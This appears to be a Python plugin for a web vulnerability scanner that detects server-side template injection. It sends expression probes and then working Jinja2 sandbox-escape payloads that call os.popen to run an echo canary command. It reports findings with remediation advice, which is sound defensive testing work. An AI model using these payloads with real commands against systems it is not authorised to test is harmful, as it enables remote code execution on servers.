"""Server-side template injection (SSTI): expression eval → sandbox escape RCE."""

from __future__ import annotations

from argos.engine.findings import Finding, Severity, truncate
from argos.engine.probe import DEFAULT_POINTS, baseline, build_points, marker, send
from argos.engine.registry import Check, ScanContext, register

# (payload, success marker) — marker present + payload consumed = evaluated
EVAL_PROBES: list[tuple[str, str]] = [
    ("{{7*'argosSSTI'}}", "argosSSTIargosSSTI"),  # jinja2/twig string repetition
    ("{{'argosSSTI'*7}}", "argosSSTIargosSSTI"),
    ("{{config}}", "Config"),  # flask config object repr
    ("<%= 7*7 %>", "49"),  # ERB
    ("${7*7}", "49"),  # generic ${}
    ("#{7*7}", "49"),  # freemarker/velocity-ish
]

# jinja2 sandbox escape → harmless command, output reflected via read()
JINJA_RCE = "{{ cycler.__init__.__globals__['os'].popen('echo {m}').read() }}"
JINJA_RCE_ALT = (
    "{{ self.__init__.__globals__['__builtins__']"
    "['__import__']('os').popen('echo {m}').read() }}"
)


@register
class SSTI(Check):
    name = "ssti"
    mode = "active"
    min_profile = "quick"
    summary = "Server-side template injection escalating to RCE proof (echo canary)"

    async def run(self, ctx: ScanContext) -> list[Finding]:
        points = build_points(ctx, limit=DEFAULT_POINTS)
        findings: list[Finding] = []

        for point in points:
            await baseline(ctx, point)
            engine_hit: str | None = None
            for payload, success in EVAL_PROBES:
                resp = await send(ctx, point, payload)
                if resp.status_code >= 500:
                    continue
                if payload in resp.text and success == "49":
                    continue  # reflected verbatim → not evaluated
                if success in resp.text and success not in (
                    point.inputs.get(point.param, ""),
                ):
                    engine_hit = payload
                    break
            if engine_hit is None:
                continue

            # escalate: prove RCE with an echo canary through the template engine
            m = marker("argosRCE")
            for rce_tmpl in (JINJA_RCE, JINJA_RCE_ALT):
                payload = rce_tmpl.replace("{m}", m)  # NOT .format(): braces are payload
                resp = await send(ctx, point, payload)
                if m in resp.text:
                    findings.append(
                        Finding(
                            plugin=self.name,
                            title="SSTI → remote code execution",
                            severity=Severity.CRITICAL,
                            cvss=9.8,
                            cwe="CWE-1336",
                            url=point.endpoint,
                            parameter=point.param,
                            description=(
                                f"Parameter '{point.param}' is evaluated by a server-side "
                                f"template engine (probe {engine_hit!r} executed). The "
                                "sandbox escaped and an OS command ran — the echoed canary "
                                f"{m} appears in the response. Full RCE as the web user."
                            ),
                            remediation=(
                                "Never render user input as a template. Use sandboxed "
                                "environments (SandboxedEnvironment), disable dangerous "
                                "globals/filters, and apply least privilege."
                            ),
                            evidence_request=(
                                f"{point.method} {point.endpoint}\n"
                                f"{point.param}={payload}"
                            ),
                            evidence_response=truncate(
                                f"HTTP {resp.status_code}\n{resp.text[:700]}", 900
                            ),
                        )
                    )
                    break
            else:
                findings.append(
                    Finding(
                        plugin=self.name,
                        title="Server-side template injection (expression evaluated)",
                        severity=Severity.HIGH,
                        cvss=8.1,
                        cwe="CWE-1336",
                        url=point.endpoint,
                        parameter=point.param,
                        description=(
                            f"Parameter '{point.param}' evaluates template expressions "
                            f"({engine_hit!r} was executed server-side). This commonly "
                            "leads to RCE depending on the engine configuration."
                        ),
                        remediation=(
                            "Do not pass user input to template rendering. Treat as RCE "
                            "risk: patch the engine, sandbox rendering, and audit "
                            "reachable gadgets."
                        ),
                        evidence_request=(
                            f"{point.method} {point.endpoint}\n{point.param}={engine_hit}"
                        ),
                        evidence_response="Expression executed in the response.",
                    )
                )
        return findings
